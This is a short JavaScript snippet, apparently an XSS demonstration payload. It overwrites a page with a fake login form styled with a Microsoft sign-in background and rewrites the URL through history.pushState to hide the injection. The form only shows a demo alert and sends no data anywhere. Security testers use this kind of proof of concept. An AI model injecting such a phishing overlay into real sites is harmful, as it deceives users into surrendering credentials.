setTimeout(() => {
  document.body.innerHTML = `
    <div style="
      font-family: sans-serif;
      text-align: center;
      margin-top: 100px;
      background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      height: 100vh;
      width: 100vw;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: white;
    ">
      <h2>Please log in</h2>
      <form onsubmit="alert('This is just a XSS demo!'); return false;" style="text-align: left; background: rgba(0,0,0,0.6); padding: 20px; border-radius: 8px;">
        <label>Username:<br><input type="text" name="user" required></label><br><br>
        <label>Password:<br><input type="password" name="pass" required></label><br><br>
        <button type="submit">Login</button>
      </form>
    </div>
  `;
  history.pushState(null, '', '/');
}, 1000);
